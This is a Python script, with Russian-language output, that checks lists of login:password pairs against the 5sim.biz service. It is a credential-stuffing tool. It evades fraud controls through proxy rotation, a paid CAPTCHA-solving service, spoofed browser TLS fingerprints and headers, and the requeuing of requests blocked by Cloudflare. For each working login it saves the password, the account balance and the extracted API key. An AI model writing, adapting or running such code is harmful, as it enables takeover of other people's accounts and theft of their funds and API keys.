import functools, tls_client, traceback, datetime, aiofiles, logging, asyncio, random, httpx, uuid, json, time, sys, os, re

from config import *

##############################################################################
logging.basicConfig(format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s', level=logging.INFO)
logging.getLogger('httpx').setLevel(logging.WARNING)

lock = asyncio.Lock()
##############################################################################
async def read_file(file_path: str, splitlines: bool = True):
	file_text = await (await aiofiles.open(file_path, 'r', encoding='utf-8')).read()
	return [x.strip() for x in list(set(file_text.splitlines())) if x.strip() != ''] if splitlines else file_text

async def write_to_file(file_path: str, text: str, mode: str = 'a'):
	file_text = await (await aiofiles.open(file_path, mode, encoding='utf-8')).write(text)

async def remove_line_from_file(file_path: str, line_to_remove: str):
	async with lock:
		async with aiofiles.open(file_path, mode='r') as f:
			lines = await f.readlines()

		lines = [line for line in lines if line.strip() != line_to_remove]

		async with aiofiles.open(file_path, mode='w') as f:
			await f.writelines(lines)


class ProxyManager:
	def __init__(self, proxy_path: str = None, proxies: list = []):
		if proxy_path and os.path.exists(proxy_path): self.proxies_to_check = [x.strip() for x in list(set(open(proxy_path, 'r', encoding='utf-8').read().splitlines())) if x.strip() != '']
		else: self.proxies_to_check = {proxy: 0 for proxy in proxies}
		self.proxies = {}

	def get_proxy(self, alr_formated: bool = True):
		try:
			min_usage_proxy = min(self.proxies, key=self.proxies.get)
			self.proxies[min_usage_proxy] += 1
			return {'http': min_usage_proxy, 'https': min_usage_proxy} if alr_formated else min_usage_proxy
		except: return None

	async def proxy_check_(self, proxy):
		if '@' in proxy:
			proxy_formated = proxy
		else:
			_proxy = proxy.split(':')
			proxy_formated = f'{_proxy[2]}:{_proxy[3]}@{_proxy[0]}:{_proxy[1]}'
		proxy_formated = f'{"http" if proxy_protocol["http"] else "socks5"}://{proxy_formated}'
		try:
			async with httpx.AsyncClient(proxies={'http://': proxy_formated, 'https://': proxy_formated}) as client:
				await client.get('http://ip.bablosoft.com')
			self.proxies[proxy_formated] = 0
		except:
			logging.info(f'[proxy_check] Invalid proxy: {proxy}')

	async def proxy_check(self):
		logging.info(f'Checking {len(self.proxies_to_check)} proxies')
		futures = []
		for proxy in list(self.proxies_to_check):
			futures.append(self.proxy_check_(proxy))
		await asyncio.gather(*futures)

class Spinner:
	@staticmethod
	async def spinner(text: str):
		spinner = '|/-\\'
		print(text, end=' ')
		while True:
			for cursor in spinner:
				sys.stdout.write(cursor)
				sys.stdout.flush()
				await asyncio.sleep(0.1)
				sys.stdout.write('\b')

	@staticmethod
	def start(text: str):
		task = asyncio.create_task(Spinner.spinner(text))
		return task
	
	@staticmethod
	def stop(task):
		try: task.cancel()
		except: ...
		sys.stdout.write('\r' + ' ' * 30 + '\r')
		sys.stdout.flush()


class SolverCapGuru:
	def __init__(self, api_key: str):
		self.api_key = api_key
		self.session = httpx.AsyncClient()

	async def create_task(self, site_key: str, captcha_url: str):
		req = (await self.session.post('https://api.cap.guru/in.php', data={'key': self.api_key, 'method': 'userrecaptcha', 'googlekey': site_key, 'pageurl': captcha_url, 'json': 1})).json()
		if req['status'] == 1:
			task_id = req['request']
		else:
			print(f'[-] Ошибка при создании капчи: {req["request"]}')
			task_id = None
		return task_id

	async def solve_recaptcha(self, site_key: str, captcha_url: str):
		task_id = await self.create_task(site_key, captcha_url)
		if not task_id: return None
		print('[+] Решаю капчу')

		while True:
			await asyncio.sleep(5)
			req = (await self.session.get('https://api.cap.guru/res.php', params={'key': self.api_key, 'action': 'get', 'id': task_id, 'json': 1})).json()

			if req['status'] == 1:
				recaptcha_token = req['request']
				logging.debug(f'recaptcha_token: {recaptcha_token}')
				return recaptcha_token
			elif req['request'] == 'CAPCHA_NOT_READY':
				continue
			else:
				print(f'[-] Ошибка при решении капчи: {req["request"]}')
				return None
		
		await self.session.aclose()

class CheckerClient:
	def __init__(self, proxy_client: ProxyManager, solver):
		self.proxy_client = proxy_client
		self.solver = solver
		self.loop = asyncio.get_event_loop()

		self.headers = {'accept': 'application/json', 'accept-language': 'ru', 'content-type': 'application/json', 'origin': 'https://5sim.biz', 'priority': 'u=1, i', 'referer': 'https://5sim.biz/', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'}

	async def get_csrf(self, session: httpx.AsyncClient):
		req = await self.loop.run_in_executor(None, functools.partial(session.get, 'https://5sim.biz/v1/guest/csrf', headers={'accept': 'application/json','accept-language': 'ru','content-type': 'application/json','origin': 'https://5sim.biz','priority': 'u=1, i','referer': 'https://5sim.biz/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'}))
		xsrf = str(req.headers['Set-Cookie']).replace('XSRF-TOKEN=;', '').split('XSRF-TOKEN=')[1].split(';')[0]
		return xsrf

	async def account_login(self, login: str, password: str):
		session = tls_client.Session(client_identifier="chrome112", random_tls_extension_order=True)
		try:
			xsrf = await self.get_csrf(session)
			solve = await self.solver.solve_recaptcha('6Lf5qwgTAAAAAKci_ZYBESf9Z_rQXtJbw7YSBBTt', 'https://5sim.biz/login')
			session.proxies = self.proxy_client.get_proxy()
			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://5sim.org/v1/guest/auth/login', json={'email': login,'password': password,'captcha': solve}, headers={'accept': 'application/json','accept-language': 'ru','content-type': 'application/json','origin': 'https://5sim.biz','priority': 'u=1, i','referer': 'https://5sim.biz/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36','x-xsrf-token': xsrf}))
			session.proxies = None

			if '"token":"' in req.text:
				token = req.json()['token']
			elif 'captcha error' in req.text:
				print('[-] Неверная капча')
				await write_to_file(recheck_save_path, f'{login}:{password}\n')
				return False
			elif req.status_code in [503, 429] or 'Attention Required! | Cloudflare' in req.text:
				print('[-] Антифрод')
				await write_to_file(recheck_save_path, f'{login}:{password}\n')
				return False
			elif 'email or password wrong' in req.text:
				print(f'[-] Невалид: {login}:{password}')
				await write_to_file(invalid_save_path, f'{login}:{password}\n')
				return False
			else:
				print(f'[-] Невалид: {req.text}')
				await write_to_file(recheck_save_path, f'{login}:{password}\n')
				return False

			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://5sim.biz/v1/guest/auth/seamless', json={'token': token}, headers={'accept': 'application/json','accept-language': 'ru','content-type': 'application/json','origin': 'https://5sim.biz','priority': 'u=1, i','referer': 'https://5sim.biz/login','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36','x-xsrf-token': xsrf}))
			xsrf = str(req.headers['Set-Cookie']).replace('XSRF-TOKEN=;', '').split('XSRF-TOKEN=')[1].split(';')[0]

			req = await self.loop.run_in_executor(None, functools.partial(session.get, 'https://5sim.biz/v1/user/profile', headers={'accept': 'application/json','accept-language': 'ru','priority': 'u=1, i','referer': 'https://5sim.biz/login','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36','x-xsrf-token': xsrf}))
			profile = req.json()
			balance = profile.get('balance', 0)
			req = await self.loop.run_in_executor(None, functools.partial(session.get, 'https://5sim.biz/v1/user/settings/api_key/third_party/get', headers={'accept': 'application/json','accept-language': 'ru','priority': 'u=1, i','referer': 'https://5sim.biz/settings/security','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36','x-xsrf-token': xsrf}))
			api_key = req.json()
			api_key = api_key.get('api_key', None)
			
			await write_to_file(valid_save_path, f'{login}:{password}:{api_key}:{balance}\n')
			print(f'[+] Валид: {login}:{password}:{api_key}:{balance}')
			return True
		except Exception as e:
			await write_to_file(recheck_save_path, f'{login}:{password}\n')
			print(f'[-] Ошибка: {e}')
			return False



async def main():
	proxy_client = ProxyManager(proxy_path=proxy_path)
	await proxy_client.proxy_check()
	if captcha_solver_service['CapGuru']: solver = SolverCapGuru(captcha_solver_key)
	else: print('Вы не выбрали сервис для решения капчи!')
	parser_client = CheckerClient(proxy_client=proxy_client, solver=solver)

	accounts = await read_file(accounts_path)
	print(f'\n\nВсего аккаунтов в базе: {len(accounts)}')
	print(f'Валидных прокси: {len(proxy_client.proxies)}\n\n\n')

	semaphore = asyncio.Semaphore(max_concurrent_tasks)

	async def login_task(acc):
		try: login, password = acc.split(':')
		except: return
		async with semaphore:
			await remove_line_from_file(accounts_path, acc)
			await parser_client.account_login(login, password)

	await asyncio.gather(*(login_task(acc) for acc in accounts))
	await solver.session.aclose()
	await write_to_file(accounts_path, '', 'w')

if __name__ == '__main__':
	asyncio.run(main())
	input('\nДля завершение нажмите Enter')